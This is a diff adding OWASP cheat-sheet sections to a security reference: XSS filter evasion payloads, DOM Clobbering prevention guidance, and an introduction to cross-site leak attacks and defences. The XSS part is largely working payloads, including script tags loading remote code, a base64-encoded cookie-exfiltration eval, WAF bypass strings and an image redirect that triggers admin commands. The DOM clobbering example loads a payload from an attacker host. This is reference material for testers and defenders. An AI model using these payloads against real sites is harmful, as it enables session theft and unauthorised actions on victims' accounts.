+echo('IPT>alert("XSS")</SCRIPT>'); ?>
+```
+
+#### IMG Embedded Commands
+
+This attack only works when this is injected (like a web-board) in a web page behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc. This is one of the lesser used but more useful XSS vectors:
+
+```html
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+```
+
+##### IMG Embedded Commands part II
+
+This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal `<IMG SRC="httx://badguy.com/a.jpg">` could actually be an attack vector to run commands as the user who views the image link. Here is the `.htaccess` (under Apache) line to accomplish the vector:
+
+```log
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+```
+
+(Thanks to Timo for part of this)
+
+#### Cookie Manipulation
+
+This method is pretty obscure but there are a few examples where `<META` is allowed and it can be used to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc):
+
+```html
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+```
+
+#### XSS Using HTML Quote Encapsulation
+
+This attack was originally tested in IE so your mileage may vary. For performing XSS on sites that allow `<SCRIPT>` but don't allow `<SCRIPT SRC...` by way of a regex filter `/\<script\[^\>\]+src/i`, do the following:
+
+```html
+<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+If you are performing XSS on sites that allow `<SCRIPT>` but don't allow `\<script src...` due to a regex filter that does `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` (This is an important one, because this regex has been seen in the wild):
+
+```html
+<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+Another XSS to evade the same filter: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`:
+
+```html
+<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+Yet another XSS that evades the same filter: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`
+
+Generally, we are not discussing mitigation techniques, but the only thing that stops this XSS example is, if you still want to allow `<SCRIPT>` tags but not remote script is a state machine (and of course there are other ways to get around this if they allow `<SCRIPT>` tags), use this:
+
+```html
+<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+And one last XSS attack to evade, `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` using grave accents (again, doesn't work in Firefox):
+
+<!-- markdownlint-disable MD038-->
+```html
+<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+<!-- markdownlint-enable MD038-->
+
+Here's an XSS example which works if the regex won't catch a matching pair of quotes but instead will find any quotes to terminate a parameter string improperly:
+
+```html
+<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:
+
+```html
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+#### URL String Evasion
+
+The following attacks work if `http://www.google.com/` is programmatically disallowed:
+
+##### IP Versus Hostname
+
+```html
+<A HREF="http://66.102.7.147/">XSS</A>
+```
+
+##### URL Encoding
+
+```html
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+```
+
+##### DWORD Encoding
+
+Note: there are other of variations of DWORD encoding - see the IP Obfuscation calculator below for more details:
+
+```html
+<A HREF="http://1113982867/">XSS</A>
+```
+
+##### Hex Encoding
+
+The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quote is not required:
+
+```html
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+```
+
+##### Octal Encoding
+
+Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc:
+
+```html
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+```
+
+##### Base64 Encoding
+
+```html
+<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
+```
+
+##### Mixed Encoding
+
+Let's mix and match base encoding and throw in some tabs and newlines (why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:
+
+<!-- markdownlint-disable MD010-->
+```html
+<A HREF="h
+tt  p://6	6.000146.0x7.147/">XSS</A>
+```
+<!-- markdownlint-enable MD010-->
+
+##### Protocol Resolution Bypass
+
+`//` translates to `http://`, which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like `(ht|f)tp(s)?://` (thanks to Ozh for part of this one). You can also change the `//` to `\\\\`. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL:
+
+```html
+<A HREF="//www.google.com/">XSS</A>
+```
+
+##### Removing CNAMEs
+
+When combined with the above URL, removing `www.` will save an additional 4 bytes for a total byte savings of 9 for servers that have set this up properly:
+
+```html
+<A HREF="http://google.com/">XSS</A>
+```
+
+Extra dot for absolute DNS:
+
+```html
+<A HREF="http://www.google.com./">XSS</A>
+```
+
+##### JavaScript Link Location
+
+```html
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+```
+
+##### Content Replace as Attack Vector
+
+<!-- markdownlint-disable MD010-->
+Assuming `http://www.google.com/` is programmatically replaced with nothing. A similar attack vector has been used against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector `java&\#x09;script:` was converted into `java	script:`, which renders in IE:
+<!-- markdownlint-enable MD010-->
+
+```html
+<A HREF="http://www.google.com/ogle.com/">XSS</A>
+```
+
+#### Assisting XSS with HTTP Parameter Pollution
+
+If a content sharing flow on a web site is implemented as shown below, this attack will work. There is a `Content` page which includes some content provided by users and this page also includes a link to `Share` page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the `title` parameter in the `Content` page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since `content_type`'s value is a constant and will always be integer, they didn't encode or validate the `content_type` in the `Share` page.
+
+##### Content Page Source Code
+
+```html
+a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
+```
+
+##### Share Page Source Code
+
+```js
+<script>
+var contentType = <%=Request.getParameter("content_type")%>;
+var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
+...
+//some user agreement and sending to server logic might be here
+...
+</script>
+```
+
+##### Content Page Output
+
+If attacker set the untrusted content title as `This is a regular title&content_type=1;alert(1)` the link in `Content` page would be this:
+
+```html
+<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
+```
+
+##### Share Page Output
+
+And in share page output could be this:
+
+```js
+<script>
+var contentType = 1; alert(1);
+var title = "This is a regular title";
+…
+//some user agreement and sending to server logic might be here
+…
+</script>
+```
+
+As a result, in this example the main flaw is trusting the content_type in the `Share` page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.
+
+### Character Escape Sequences
+
+Here are all the possible combinations of the character `\<` in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.
+
+- `<`
+- `%3C`
+- `&lt`
+- `&lt;`
+- `&LT`
+- `&LT;`
+- `&#60`
+- `&#060`
+- `&#0060`
+- `&#00060`
+- `&#000060`
+- `&#0000060`
+- `&#60;`
+- `&#060;`
+- `&#0060;`
+- `&#00060;`
+- `&#000060;`
+- `&#0000060;`
+- `&#x3c`
+- `&#x03c`
+- `&#x003c`
+- `&#x0003c`
+- `&#x00003c`
+- `&#x000003c`
+- `&#x3c;`
+- `&#x03c;`
+- `&#x003c;`
+- `&#x0003c;`
+- `&#x00003c;`
+- `&#x000003c;`
+- `&#X3c`
+- `&#X03c`
+- `&#X003c`
+- `&#X0003c`
+- `&#X00003c`
+- `&#X000003c`
+- `&#X3c;`
+- `&#X03c;`
+- `&#X003c;`
+- `&#X0003c;`
+- `&#X00003c;`
+- `&#X000003c;`
+- `&#x3C`
+- `&#x03C`
+- `&#x003C`
+- `&#x0003C`
+- `&#x00003C`
+- `&#x000003C`
+- `&#x3C;`
+- `&#x03C;`
+- `&#x003C;`
+- `&#x0003C;`
+- `&#x00003C;`
+- `&#x000003C;`
+- `&#X3C`
+- `&#X03C`
+- `&#X003C`
+- `&#X0003C`
+- `&#X00003C`
+- `&#X000003C`
+- `&#X3C;`
+- `&#X03C;`
+- `&#X003C;`
+- `&#X0003C;`
+- `&#X00003C;`
+- `&#X000003C;`
+- `\x3c`
+- `\x3C`
+- `\u003c`
+- `\u003C`
+
+### Methods to Bypass WAF – Cross-Site Scripting
+
+#### General issues
+
+##### Stored XSS
+
+If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.
+
+##### Reflected XSS in JavaScript
+
+Example:
+
+```js
+<script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
+```
+
+Exploitation:
+
+```js
+/?xss=500); alert(document.cookie);//
+```
+
+##### DOM-based XSS
+
+Example:
+
+```js
+<script> ... eval($\_GET\[xss\]); ... </script>
+```
+
+Exploitation:
+
+```js
+/?xss=document.cookie
+```
+
+##### XSS via request Redirection
+
+Vulnerable code:
+
+```js
+...
+header('Location: '.$_GET['param']);
+...
+```
+
+As well as:
+
+```js
+...
+header('Refresh: 0; URL='.$_GET['param']);
+...
+```
+
+This request will not pass through the WAF:
+
+```html
+/?param=<javascript:alert(document.cookie>)
+```
+
+This request will pass through the WAF and an XSS attack will be conducted in certain browsers:
+
+```html
+/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+```
+
+#### WAF ByPass Strings for XSS
+
+<!-- markdownlint-disable MD038-->
+- `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
+- `<Video> <source onerror = "javascript: alert (XSS)">`
+- `<Input value = "XSS" type = text>`
+- `<applet code="javascript:confirm(document.cookie);">`
+- `<isindex x="javascript:" onmouseover="alert(XSS)">`
+- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
+- `"><img src="x:x" onerror="alert(XSS)">`
+- `"><iframe src="javascript:alert(XSS)">`
+- `<object data="javascript:alert(XSS)">`
+- `<isindex type=image src=1 onerror=alert(XSS)>`
+- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
+- `<img  src="x:gif" onerror="window['al\u0065rt'](https://cheatsheetseries.owasp.org/cheatsheets/0)"></img>`
+- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
+- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
+
+```html
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+```
+
+- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
+- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
+- `<form><a href="javascript:\u0061lert(1)">X`
+- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
+- `<style>//*{x:expression(alert(/xss/))}//<style></style>`
+
+ On Mouse Over​:
+
+- `<img src="/" =_=" title="onerror='prompt(1)'">`
+- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
+
+```html
+<script x> alert(1) </script 1=2
+```
+
+- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
+- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
+- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
+- `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> `
+<!-- markdownlint-enable MD038-->
+
+#### Filter Bypass Alert Obfuscation
+
+- `(alert)(1)`
+- `a=alert,a(1)`
+- `[1].find(alert)`
+- `top[“al”+”ert”](https://cheatsheetseries.owasp.org/cheatsheets/1)`
+- `top[/al/.source+/ert/.source](https://cheatsheetseries.owasp.org/cheatsheets/1)`
+- `al\u0065rt(1)`
+- `top[‘al\145rt’](https://cheatsheetseries.owasp.org/cheatsheets/1)`
+- `top[‘al\x65rt’](https://cheatsheetseries.owasp.org/cheatsheets/1)`
+- `top[8680439..toString(30)](https://cheatsheetseries.owasp.org/cheatsheets/1)`
+- `alert?.()`
+- `(alert())`
+
+The payload should include leading and trailing backticks:
+
+```js
+&#96;`${alert``}`&#96;
+```
+
+## DOM Clobbering Prevention
+
+> **Source:** [DOM Clobbering Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+[DOM Clobbering](https://domclob.xyz/domc_wiki/#overview) is a type of code-reuse, HTML-only injection attack, where attackers confuse a web application by injecting HTML elements whose `id` or `name` attribute matches the name of security-sensitive variables or browser APIs, such as variables used for fetching remote content (e.g., script src), and overshadow their value.
+
+It is particularly relevant when script injection is not possible, e.g., when filtered by HTML sanitizers, or mitigated by disallowing or controlling script execution. In these scenarios, attackers may still inject non-script HTML markups into webpages and transform the initially secure markup into executable code, achieving [Cross-Site Scripting (XSS)](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
+
+**This cheat sheet is a list of guidelines, secure coding patterns, and practices to prevent or restrict the impact of DOM Clobbering in your web application.**
+
+### Background
+
+Before we dive into DOM Clobbering, let's refresh our knowledge with some basic Web background.
+
+When a webpage is loaded, the browser creates a [DOM tree](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction) that represents the structure and content of the page, and JavaScript code has read and write access to this tree.
+
+When creating the DOM tree, browsers also create an attribute for (some) named HTML elements on `window` and `document` objects. Named HTML elements are those having an `id` or `name` attribute. For example, the markup:
+
+```html
+<form id=x name=x></form>
+```
+
+creates named references to the form on `window` and `document`. The `name` attribute is needed for [named access on `document`](https://html.spec.whatwg.org/multipage/dom.html#dom-document-nameditem); a form's `id` alone does not provide that reference:
+
+```js
+var obj1 = document.getElementById('x');
+var obj2 = document.x;
+var obj3 = document.x;
+var obj4 = window.x;
+var obj5 = x; // by default, objects belong to the global Window, so x is same as window.x
+console.log(
+ obj1 === obj2 && obj2 === obj3 &&
+ obj3 === obj4 && obj4 === obj5
+); // true
+```
+
+When accessing an attribute of `window` and `document` objects, named HTML element references come before lookups of built-in APIs and other attributes on `window` and `document` that developers have defined, also known as [named property accesses](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object). Developers unaware of such behavior may use the content of window/document attributes for sensitive operations, such as URLs for fetching remote content, and attackers can exploit it by injecting markups with colliding names. Similarly to custom attributes/variables, built-in browser APIs may be overshadowed by DOM Clobbering.
+
+If attackers are able to inject (non-script) HTML markup in the DOM tree,
+it can change the value of a variable that the web application relies on due to named property accesses, causing it to malfunction, expose sensitive data, or execute attacker-controlled scripts. DOM Clobbering works by taking advantage of this (legacy) behavior, causing a namespace collision between the execution environment (i.e., `window` and `document` objects), and JavaScript code.
+
+#### Example Attack 1
+
+```javascript
+let redirectTo = window.redirectTo || '/profile/';
+location.assign(redirectTo);
+```
+
+The attacker can:
+
+- inject the markup `<a id=redirectTo href='javascript:alert(1)'></a>` and obtain XSS.
+- inject the markup `<a id=redirectTo href='https://phishing.example/'></a>` and obtain open redirect.
+
+#### Example Attack 2
+
+```javascript
+var script = document.createElement('script');
+let src = window.config.url || 'script.js';
+script.src = src;
+document.body.appendChild(script);
+```
+
+The attacker can inject the markup `<a id=config></a><a id=config name=url href='https://attacker.example/payload.js'></a>` to load additional JavaScript code, and obtain arbitrary client-side code execution.
+
+### Summary of Guidelines
+
+For quick reference, below is the summary of guidelines discussed next.
+
+|    | **Guidelines**                                                | Description                                                               |
+|----|---------------------------------------------------------------|---------------------------------------------------------------------------|
+| \# 1  | Use HTML Sanitizers                                           | [link](#1-html-sanitization)                                              |
+| \# 2  | Use Content-Security Policy                                   | [link](#2-content-security-policy)                                        |
+| \# 3  | Freeze Application Configuration Objects                                  | [link](#3-freezing-application-configuration-objects)                                 |
+| \# 4  | Validate All Inputs to DOM Tree                               | [link](#4-validate-all-inputs-to-dom-tree)                                |
+| \# 5  | Use Explicit Variable Declarations                            | [link](#5-use-explicit-variable-declarations)                             |
+| \# 6  | Do Not Use Document and Window for Global Variables           | [link](#6-do-not-use-document-and-window-for-global-variables)            |
+| \# 7  | Do Not Trust Document Built-in APIs Before Validation         | [link](#7-do-not-trust-document-built-in-apis-before-validation)          |
+| \# 8  | Enforce Type Checking                                         | [link](#8-enforce-type-checking)                                          |
+| \# 9  | Use Strict Mode                                               | [link](#9-use-strict-mode)                                                |
+| \# 10 | Apply Browser Feature Detection                               | [link](#10-apply-browser-feature-detection)                               |
+| \# 11 | Limit Variables to Local Scope                                | [link](#11-limit-variables-to-local-scope)                                |
+| \# 12 | Use Unique Variable Names In Production                       | [link](#12-use-unique-variable-names-in-production)                       |
+| \# 13 | Use Object-oriented Programming Techniques like Encapsulation | [link](#13-use-object-oriented-programming-techniques-like-encapsulation) |
+
+### Mitigation Techniques
+
+#### \#1: HTML Sanitization
+
+Robust HTML sanitizers can prevent or restrict the risk of DOM Clobbering. They can do so in multiple ways. For example:
+
+- completely remove named properties like `id` and `name`. While effective, this may hinder the usability when named properties are needed for legitimate functionalities.
+- namespace isolation, which can be, for example, prefixing the value of named properties by a constant string to limit the risk of naming collisions.
+- dynamically checking if named properties of the input mark has collisions with the existing DOM tree, and if that is the case, then remove named properties of the input markup.
+
+OWASP recommends [DOMPurify](https://github.com/cure53/DOMPurify) or the [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) for HTML sanitization.
+
+##### DOMPurify Sanitizer
+
+By default, DOMPurify removes all clobbering collisions with **built-in** APIs and properties (using the enabled-by-default `SANITIZE_DOM` configuration option).
+
+To be protected against clobbering of custom variables and properties as well, you need to enable the `SANITIZE_NAMED_PROPS` config:
+
+```js
+var clean = DOMPurify.sanitize(dirty, {SANITIZE_NAMED_PROPS: true});
+```
+
+This would isolate the namespace of named properties and JavaScript variables by prefixing them with `user-content-` string.
+
+##### Sanitizer API
+
+Use the browser's [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/Sanitizer) only where the required methods are supported. Start with its default configuration and explicitly disallow `id` and `name` using [`removeAttribute()`](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/removeAttribute), which removes the attribute from all elements:
+
+```js
+const sanitizerInstance = new Sanitizer();
+sanitizerInstance.removeAttribute('id');
+sanitizerInstance.removeAttribute('name');
+containerDOMElement.setHTML(input, {sanitizer: sanitizerInstance});
+```
+
+This example assumes the application does not need `id` or `name` attributes in the untrusted markup. In unsupported browsers, use the DOMPurify configuration above; do not fall back to inserting unsanitized HTML.
+
+#### \#2: Content-Security Policy
+
+[Content-Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) is a set of rules that tell the browser which resources are allowed to be loaded on a web page. By restricting the sources of JavaScript files (e.g., with the [script-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) directive), CSP can prevent malicious code from being injected into the page.
+
+**Note:** CSP can only mitigate **some variants** of DOM clobbering attacks, such as when attackers attempt to load new scripts by clobbering script sources, but not when already-present code can be abused for code execution, e.g., clobbering the parameters of code evaluation constructs like `eval()`.
+
+#### \#3: Freezing Application Configuration Objects
+
+Use [Object.freeze()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze#description) only as an additional control for application-owned configuration objects initialized with trusted values and retained in local scope. It prevents replacement of their own data properties, but is shallow: nested objects and values returned by getters can still change.
+
+Do not rely on freezing `window`, `document`, or DOM elements to prevent named-property clobbering. For example, [`window` rejects attempts to prevent extensions](https://html.spec.whatwg.org/multipage/nav-history-apis.html#windowproxy-preventextensions), so `Object.freeze(window)` throws. Use [HTML sanitization](#1-html-sanitization) and [local variables](#11-limit-variables-to-local-scope) to avoid attacker-controlled named-property lookups.
+
+### Secure Coding Guidelines
+
+DOM Clobbering can be avoided by defensive programming and adhering to a few coding patterns and guidelines.
+
+#### \#4: Validate All Inputs to DOM Tree
+
+Before inserting any markup into the webpage's DOM tree, sanitize `id` and `name` attributes (see [HTML sanitization](#1-html-sanitization)).
+
+#### \#5: Use Explicit Variable Declarations
+
+When initializing variables, always use a variable declarator like `var`, `let` or `const`, which prevents clobbering of the variable.
+
+**Note:** Declaring a variable with `let` does not create a property on `window`, unlike `var`. Therefore, `window.VARNAME` can still be clobbered (assuming `VARNAME` is the name of the variable).
+
+#### \#6: Do Not Use Document and Window for Global Variables
+
+Avoid using objects like `document` and `window` for storing global variables, because they can be easily manipulated. (see, e.g., [here](https://domclob.xyz/domc_wiki/indicators/patterns.html#do-not-use-document-for-global-variables)).
+
+#### \#7: Do Not Trust Document Built-in APIs Before Validation
+
+Document properties, including built-in ones, are always overshadowed by DOM Clobbering, even right after they are assigned a value.
+
+**Hint:** This is due to the so-called [named property visibility algorithm](https://webidl.spec.whatwg.org/#legacy-platform-object-abstract-ops), where named HTML element references come before lookups of built-in APIs and other attributes on `document`.
+
+#### \#8: Enforce Type Checking
+
+Always check the type of `document` and `window` properties before using them in sensitive operations, e.g., using the [`instanceof`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/instanceof) operator.
+
+**Hint:** When an object is clobbered, it would refer to an [`Element`](https://developer.mozilla.org/en-US/docs/Web/API/Element) instance, which may not be the expected type.
+
+#### \#9: Use Strict Mode
+
+Use `strict` mode to prevent unintended global variable creation, and to [raise an error](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Read-only) when read-only properties are attempted to be over-written.
+
+#### \#10: Apply Browser Feature Detection
+
+Instead of relying on browser-specific features or properties, use feature detection to determine whether a feature is supported before using it. This can help prevent errors and DOM Clobbering that might arise when using those features in unsupported browsers.
+
+**Hint:** Unsupported feature APIs can act as an undefined variable/property in unsupported browsers, making them clobberable.
+
+#### \#11: Limit Variables to Local Scope
+
+Global variables are more prone to being overwritten by DOM Clobbering. Whenever possible, use local variables and object properties.
+
+#### \#12: Use Unique Variable Names In Production
+
+Using unique variable names may help prevent naming collisions that could lead to accidental overwrites.
+
+#### \#13: Use Object-oriented Programming Techniques like Encapsulation
+
+Encapsulating variables and functions within objects or classes can help prevent them from being overwritten. By making them private, they cannot be accessed from outside the object, making them less prone to DOM Clobbering.
 
 ## Content Security Policy
 
@@ -2142,6 +3470,316 @@ Activate [designMode](https://developer.mozilla.org/en-US/docs/Web/API/Document/
 document.designMode = "on";
 ```
 
+## Cross-site leaks
+
+> **Source:** [Cross-site leaks](https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+This article describes examples of attacks and defenses against cross-site leaks vulnerability (XS Leaks). Since this vulnerability is based on the core mechanism of modern web browsers, it's also called a browser side-channel attack. XS-Leaks attacks seek to exploit the fact of seemingly insignificant information that is exchanged in cross-site communications between sites. This information infers answers to the previously asked questions about the victim's user account. Please take a look at the examples provided below:
+
+- Is the user currently logged in?
+- Is the user ID 1337?
+- Is the user an administrator?
+- Does the user have a person with a particular email address in their contact list?
+
+On the basis of such questions, the attacker might try to deduce the answers, depending on the application's context. In most cases, the answers will be in binary form (yes or no). The impact of this vulnerability depends strongly on the application's risk profile. Despite this, XS Leaks may pose a real threat to user privacy and anonymity.
+
+### Attack vector
+
+![XS Leaks Attack Vector](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Attack_Vector.png)
+
+- The entire attack takes place on the victim's browser side - just like an XSS attack
+- In some cases, the victim must remain on the attacker's site longer for the attack to succeed.
+
+### Same Origin Policy (SOP)
+
+Before describing attacks, it's good to understand one of the most critical security mechanisms in browsers - The Same-origin Policy. A few key aspects:
+
+- Two URLs are considered as **same-origin** if their **protocol**, **port**, and **host** are the same
+- Any origin can send a request to another source, but due to the Same-origin Policy, they will not be able to read the response directly
+- Same Origin Policy may be relaxed by [Cross Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).
+
+| Origin A              | Origin B                  | Same origin?                   |
+| -------------         | -------------             | -------------                  |
+| `https://example.com` | `http://sub.example.com`  | No, different hosts             |
+| `https://example.com` | `https://example.com:443` | Yes! Implicit port in Origin A |
+
+Although the SOP principle protects us from accessing information in cross-origin communication, XS-Leaks attacks based on residual data can infer some information.
+
+### SameSite Cookies
+
+The SameSite attribute of a cookie tells the browser whether it should include the cookie in the request from the other site. The SameSite attribute takes the following values:
+
+- `None` -  the cookie will be attached to a request from another site, but it must be sent over a secure HTTPS channel
+- `Lax` - the cookie will be appended to the request from another page if the request method is GET and the request is made to top-level navigation (i.e. the navigation changes the address in the browser top bar)
+- `Strict` - the cookie will never be sent from another site
+
+It is worth mentioning here the attitude of Chromium based browsers in which cookies without SameSite attribute set by default are treated as Lax.
+
+SameSite cookies are a strong **defense-in-depth** mechanism against **some** classes of XS Leaks and [CSRF attacks](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html), which can significantly reduce the attack surface, but may not completely cut them (see, e.g., [window-based XS Leak](https://soheilkhodayari.github.io/same-site-wiki/docs/attacks/xs-leaks.html) attacks like [frame counting](https://xsleaks.dev/docs/attacks/frame-counting/) and [navigation](https://xsleaks.dev/docs/attacks/navigations/)).
+
+#### How do we know that two sites are SameSite?
+
+![XS Leaks eTLD explanation](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Leaks_eTLD.png)
+
+For SameSite cookies, a [site](https://developer.mozilla.org/en-US/docs/Glossary/Site) consists of the scheme and the registrable domain (eTLD+1). The port is not part of the site. For example:
+
+| Full URL                                      | Site (scheme + eTLD+1)             |
+| --------------------------------------------  | ------------------------  |
+| `https://example.com:443/data?query=test`     | `https://example.com`     |
+
+Why are we talking about eTLD+1 and not just TLD+1? It's because of domains like `.github.io` or `.eu.org`. Such parts are not atomic enough to be compared well. For this reason, a list of "effective" TLDs (eTLDs) was created and can be found [here](https://publicsuffix.org/list/public_suffix_list.dat).
+
+Sites with the same scheme and eTLD+1 are considered same-site. For example:
+
+| Origin A                  | Origin B                   | SameSite?                    |
+| ------------------------- | -------------------------- | ---------------------        |
+| `https://example.com`     | `http://example.com`       | No, different schemes    |
+| `https://evil.net`        | `https://example.com`      | No, different eTLD+1          |
+| `https://sub.example.com` | `https://data.example.com` | Yes, subdomains don't matter |
+
+For more information about SameSite, see the excellent article [Understanding "same-site"](https://web.dev/same-site-same-origin/).
+
+### Attacks using the element ID attribute
+
+Elements in the DOM can have an ID attribute that is unique within the document. For example:
+
+```html
+<button id="pro">Pro account</button>
+```
+
+The browser will automatically focus on an element with a given ID if we append a hash to the URL, e.g. `https://example.com#pro`. What's more, the JavaScript [focus event](https://developer.mozilla.org/en-US/docs/Web/API/Element/focus_event) gets fired. The attacker may try to embed the application in the iframe with specific source on its own controlled page:
+
+![XS-Leaks-ID](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Leaks_ID.png)
+
+then add listener in main document for [blur event](https://developer.mozilla.org/en-US/docs/Web/API/Element/blur_event) (the opposite of focus). When the victim visits the attackers site, the blur event gets fired. The attacker will be able to conclude that the victim has a pro account.
+
+#### Defense
+
+##### Framing protection
+
+If you don't need other origins to embed your application in a frame, you can consider using one of two mechanisms:
+
+- **Content Security Policy `frame-ancestors`** directive. [Read more about syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors).
+- **X-Frame-Options**  - mainly if you want to support old browsers.
+
+Setting up framing protection efficiently blocks the ability to embed your application in a frame on the attacker-controlled origin and protects from other attacks like [Clickjacking](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).
+
+##### Fetch metadata (Sec-Fetch-Dest)
+
+Sec-Fetch-Dest header provides us with a piece of information about what is the end goal of the request. This header is included automatically by the browser and is one of the headers within the Fetch Metadata standard.
+
+With Sec-Fetch-Dest you can build effective own resource isolation policies, for example:
+
+```javascript
+app.get('/', (req, res) => {
+    if (req.get('Sec-Fetch-Dest') === 'iframe') {
+        return res.sendStatus(403);
+    }
+    res.send({
+        message: 'Hello!'
+    });
+});
+```
+
+![XS Leaks Sec-Fetch-Dest](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Leaks_Sec_Fetch_Dest.png)
+
